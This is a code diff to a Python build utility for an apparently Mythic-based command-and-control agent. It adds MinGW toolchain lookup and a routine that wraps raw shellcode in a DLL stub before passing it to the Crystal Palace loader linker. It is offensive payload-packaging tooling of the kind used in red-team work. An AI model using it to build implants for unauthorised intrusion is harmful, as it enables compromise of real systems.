@@ -1,6 +1,8 @@
 import os
 import asyncio
+import shutil
 import tempfile
+import subprocess
 import logging
 
 from mythic_container.MythicRPC import *
@@ -9,6 +11,36 @@ logger = logging.getLogger("starburst.crystal_utilities")
 
 AGENT_CODE_PATH = os.path.join(os.path.dirname(__file__), "agent_code")
 LOADERS_PATH = os.path.join(os.path.dirname(__file__), "..", "loaders", "crystal-palace")
+STUB_SRC = os.path.join(os.path.dirname(__file__), "..", "loaders", "sc_stub.c")
+
+
+def _find_tool(prefixed_name, fallback_name, search_dirs=None):
+    path = shutil.which(prefixed_name)
+    if path:
+        return path
+    if search_dirs:
+        for d in search_dirs:
+            candidate = os.path.join(d, prefixed_name + ".exe")
+            if os.path.isfile(candidate):
+                return candidate
+            candidate = os.path.join(d, fallback_name + ".exe")
+            if os.path.isfile(candidate):
+                return candidate
+    path = shutil.which(fallback_name)
+    if path:
+        return path
+    return prefixed_name
+
+
+_MSYS2_X64 = ["C:\\msys64\\mingw64\\bin"]
+_MSYS2_X86 = ["C:\\msys64\\mingw32\\bin"]
+
+CC_X64 = _find_tool("x86_64-w64-mingw32-gcc", "gcc", _MSYS2_X64)
+CC_X86 = _find_tool("i686-w64-mingw32-gcc", "gcc", _MSYS2_X86)
+LD_X64 = _find_tool("x86_64-w64-mingw32-ld", "ld", _MSYS2_X64)
+LD_X86 = _find_tool("i686-w64-mingw32-ld", "ld", _MSYS2_X86)
+OBJCOPY_X64 = _find_tool("x86_64-w64-mingw32-objcopy", "objcopy", _MSYS2_X64)
+OBJCOPY_X86 = _find_tool("i686-w64-mingw32-objcopy", "objcopy", _MSYS2_X86)
 
 
 def get_crystal_linker_path():
@@ -21,7 +53,72 @@ def is_crystal_palace_available():
     return os.path.exists(jar_file)
 
 
-async def link_shellcode_with_cp(shellcode_bytes, arch="x64", loader_path=None):
+def _toolchain_env(cc_path):
+    env = os.environ.copy()
+    tooldir = os.path.dirname(cc_path)
+    if tooldir:
+        env["PATH"] = tooldir + os.pathsep + env.get("PATH", "")
+    return env
+
+
+def _wrap_shellcode_in_dll(shellcode_bytes, arch, tmpdir):
+    sc_bin = os.path.join(tmpdir, "payload.bin")
+    sc_obj = os.path.join(tmpdir, "payload.o")
+    stub_obj = os.path.join(tmpdir, "stub.o")
+    dll_path = os.path.join(tmpdir, "stub.dll")
+
+    with open(sc_bin, "wb") as f:
+        f.write(shellcode_bytes)
+
+    cc = CC_X64 if arch == "x64" else CC_X86
+    ld = LD_X64 if arch == "x64" else LD_X86
+    objcopy = OBJCOPY_X64 if arch == "x64" else OBJCOPY_X86
+    env = _toolchain_env(cc)
+
+    proc = subprocess.run(
+        [ld, "-r", "-b", "binary", "-o", sc_obj, "payload.bin"],
+        cwd=tmpdir, capture_output=True, text=True, timeout=30, env=env,
+    )
+    if proc.returncode != 0:
+        raise RuntimeError(f"ld binary embed failed: {proc.stderr}")
+
+    proc = subprocess.run(
+        [cc, "-c", "-O1", "-o", stub_obj, STUB_SRC],
+        capture_output=True, text=True, timeout=30, env=env,
+    )
+    if proc.returncode != 0:
+        raise RuntimeError(f"stub compile failed: {proc.stderr}")
+
+    sym_prefix = "_binary_payload_bin_"
+    cdecl_prefix = "_" if arch == "x86" else ""
+
+    for old_sym, new_sym in [
+        (sym_prefix + "start", cdecl_prefix + "sc_payload"),
+        (sym_prefix + "end", cdecl_prefix + "sc_payload_end"),
+    ]:
+        proc = subprocess.run(
+            [objcopy, "--redefine-sym", f"{old_sym}={new_sym}", sc_obj],
+            capture_output=True, text=True, timeout=30, env=env,
+        )
+        if proc.returncode != 0:
+            raise RuntimeError(f"objcopy redefine failed: {proc.stderr}")
+
+    link_flags = [cc, "-shared", "-nostartfiles", "-e", "DllMain",
+                   "-o", dll_path, stub_obj, sc_obj, "-lkernel32"]
+    if arch == "x86":
+        link_flags.insert(-1, "-Wl,--enable-stdcall-fixup")
+
+    proc = subprocess.run(
+        link_flags,
+        capture_output=True, text=True, timeout=30, env=env,
+    )
+    if proc.returncode != 0:
+        raise RuntimeError(f"DLL link failed: {proc.stderr}")
+
+    return dll_path
+
+
+async def link_shellcode_with_cp(shellcode_bytes, arch="x64", loader_path=None, use_dll_stub=False):
     if loader_path is None:
         loader_path = os.path.join(LOADERS_PATH, "default")
 
@@ -32,14 +129,22 @@ async def link_shellcode_with_cp(shellcode_bytes, arch="x64", loader_path=None):
         raise FileNotFoundError(f"loader.spec not found at {spec_file}")
 
     with tempfile.TemporaryDirectory() as tmpdir:
-        sc_path = os.path.join(tmpdir, "shellcode.bin")
         out_path = os.path.join(tmpdir, f"out.{arch}.bin")
-
-        with open(sc_path, "wb") as f:
-            f.write(shellcode_bytes)
-
         jar_path = os.path.join(crystal_linker, "crystalpalace.jar")
-        command = ["java", "-jar", jar_path, "link", spec_file, sc_path, out_path]
+
+        if use_dll_stub:
+            dll_path = _wrap_shellcode_in_dll(shellcode_bytes, arch, tmpdir)
+            command = [
+                "java", "-jar", jar_path, "link", spec_file, dll_path, out_path,
+            ]
+        else:
+            sc_path = os.path.join(tmpdir, "payload.bin")
+            with open(sc_path, "wb") as f:
+                f.write(shellcode_bytes)
+            command = [
+                "java", "-jar", jar_path, "build", spec_file, arch, out_path,
+                f"%SHELLCODE={sc_path}",
+            ]
 
         proc = await asyncio.create_subprocess_exec(
             *command,
@@ -51,7 +156,7 @@ async def link_shellcode_with_cp(shellcode_bytes, arch="x64", loader_path=None):
 
         if proc.returncode != 0:
             raise RuntimeError(
-                f"Crystal Palace link failed (rc={proc.returncode}):\n"
+                f"Crystal Palace failed (rc={proc.returncode}):\n"
                 f"stdout: {stdout.decode()}\n"
                 f"stderr: {stderr.decode()}"
             )
